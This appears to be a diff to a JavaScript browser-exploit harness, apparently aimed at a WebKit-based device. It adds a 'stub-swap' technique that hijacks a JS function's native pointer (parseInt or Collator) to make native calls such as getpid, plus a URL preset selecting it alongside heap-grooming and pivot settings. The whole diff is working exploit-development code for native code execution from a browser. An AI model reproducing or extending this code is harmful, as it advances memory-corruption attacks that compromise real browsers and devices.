@@ -73,6 +73,7 @@ import {
 import { probeLibkernelViaVtable } from "./vtable_lk_probe.js";
 import { createCrashLog } from "./log_persist.js";
 import { fireCoreGetpid, fireCoreNotify, bisectCoreTriggerLite } from "./core_native.js?v=core-6";
+import { fireStubSwapParseInt, fireCollatorStub, pinCollatorStub, verifyStubSwapArm } from "./stub_call.js?v=stub-1";
 import { prepNativeChain, stageGetpid, stageUsleep, stageNotify, fireNativeCall, fireUsleep, fireNotify, firePivotSmoke,
     resolvePivotBuiltin, firePivotTrigger,
     firePivotGetpid,
@@ -90,7 +91,7 @@ import { prepNativeChain, stageGetpid, stageUsleep, stageNotify, fireNativeCall,
     prepGadgetRvaStale, refreshPrepSlabGadgets,
     CHAIN_POP_ROWS } from "./native_call.js?v=nc-20250831r";
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250831s";
+const BUILD_ID = "rw-20250901a";
 
 function usePoopsNativePath() {
     return params.get("nativepath") === "poops";
@@ -98,6 +99,10 @@ function usePoopsNativePath() {
 
 function useCoreNativePath() {
     return params.get("nativepath") === "core" || params.get("nativepath") === "parseint";
+}
+
+function useStubNativePath() {
+    return params.get("nativepath") === "stub" || params.get("nativepath") === "direct";
 }
 
 /** Heavy native slab @ Start only when requested — 2e Leak+lk must stay lightweight. */
@@ -5485,6 +5490,52 @@ function runFireGetpid() {
         renderOut();
         return;
     }
+
+    if (useStubNativePath()) {
+        busy = true;
+        nativeQuiet = true;
+        mark("STUB-FIRE", "direct m_function stub-swap — NO ROP slab build=" + BUILD_ID);
+        renderOut();
+        try {
+            const stubKind = params.get("stubkind") || "stub20";
+            if (params.get("stubmode") === "collator") {
+                if (!window._stubCollatorPin)
+                    window._stubCollatorPin = pinCollatorStub(retained);
+                const r = fireCollatorStub(p, window._stubCollatorPin, lk, off, { stubKind });
+                mark("STUB-OK", r.path + " result=" + r.result + " stub=" + r.stubTag);
+                state("collator stub fired", "ok");
+            } else if (params.get("stubmode") === "arm") {
+                const v = verifyStubSwapArm(p, off, lk, { stubKind });
+                mark(v.ok ? "STUB-ARM-OK" : "STUB-ARM-FAIL", "mainMf=" + v.mainMf + " got=" + v.got);
+                state(v.ok ? "stub arm OK" : "stub arm fail", v.ok ? "ok" : "bad");
+            } else {
+                const r = fireStubSwapParseInt(p, off, lk, {
+                    carrier: window._wkCarrier,
+                    stubKind,
+                });
+                mark("STUB-OK", r.path + " " + r.stubTag + " jsResult=" + r.result
+                    + " arg=" + r.fireArg);
+                const pid = (typeof r.result === "number" && r.result > 0 && r.result < 1000000)
+                    ? r.result : -1;
+                if (pid > 0) {
+                    mark("NATIVE-OK", "stub getpid=" + pid + " build=" + BUILD_ID);
+                    state("stub getpid " + pid, "ok");
+                } else {
+                    mark("STUB-HINT", "tab survived — jsResult may not be pid; try index_stub.html bisect");
+                    state("stub survived", "warn");
+                }
+            }
+        } catch (err) {
+            mark("STUB-FAIL", (err.message || String(err)) + " build=" + BUILD_ID);
+            state("stub failed", "bad");
+        } finally {
+            busy = false;
+            nativeQuiet = false;
+            renderOut();
+        }
+        return;
+    }
+
     if (!gateNativeFire(p, off)) {
         state("pivot not ready", "warn");
         renderOut();
@@ -5918,6 +5969,14 @@ const NATIVE_OPTION_PRESETS = {
         freshprep: true,
         nativeprep: false,
     },
+    "stub-getpid": {
+        groom: "96",
+        nativepath: "stub",
+        native: "getpid",
+        freshprep: false,
+        nativeprep: false,
+        pivot: "ta",
+    },
 };
 
 function detectNativePresetFromUrl() {
@@ -5935,6 +5994,8 @@ function detectNativePresetFromUrl() {
         return "2e-default";
     if (np === "poops" && nat === "smoke" && fp && !nprep)
         return "poops-smoke";
+    if ((np === "stub" || np === "direct") && nat === "getpid" && gkey === "96")
+        return "stub-getpid";
     return "";
 }
 
